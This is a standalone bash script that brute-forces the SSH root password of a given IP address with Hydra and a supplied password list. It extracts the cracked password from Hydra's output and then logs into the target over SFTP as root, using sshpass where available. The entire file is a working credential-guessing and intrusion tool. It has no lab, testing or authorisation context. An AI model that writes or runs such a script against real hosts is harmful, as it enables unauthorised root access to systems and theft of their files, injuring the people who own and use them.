#!/bin/bash

# Check if correct number of arguments are supplied
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP_Address> <Password_File>"
    echo "Example: $0 192.168.1.50 passwords.txt"
    exit 1
fi

TARGET_IP="$1"
PASS_FILE="$2"

# Check if password file exists
if [ ! -f "$PASS_FILE" ]; then
    echo "[-] Error: Password file '$PASS_FILE' not found."
    exit 1
fi

echo "[*] Starting Hydra SSH brute-force against $TARGET_IP for user 'root'"
echo "[*] Using password list: $PASS_FILE"
echo "--------------------------------------------------"

# Temporary file to store Hydra output
OUTPUT_FILE=$(mktemp)

# Run Hydra and save output while displaying it live
hydra -f -l root -P "$PASS_FILE" ssh://"$TARGET_IP" | tee "$OUTPUT_FILE"

# Extract the successfully found password using awk/grep
FOUND_LINE=$(grep "login:" "$OUTPUT_FILE" | head -n 1)
rm -f "$OUTPUT_FILE"

if [ -n "$FOUND_LINE" ]; then
    # Parse out the password from Hydra's success string
    PASSWORD=$(echo "$FOUND_LINE" | awk -F 'password: ' '{print $2}')
    
    echo -e "\n[+] Success! Found credentials: root / $PASSWORD"
    echo "[*] Opening SFTP connection to $TARGET_IP..."
    
    # Use sshpass to pass the discovered password into sftp automatically
    if command -v sshpass &> /dev/null; then
        sshpass -p "$PASSWORD" sftp root@"$TARGET_IP"
    else
        echo "[!] 'sshpass' is not installed. Launching standard sftp prompt (you will need to type the password):"
        sftp root@"$TARGET_IP"
    fi
else
    echo -e "\n[-] Brute-force finished, but no valid credentials were found."
    exit 1
fi
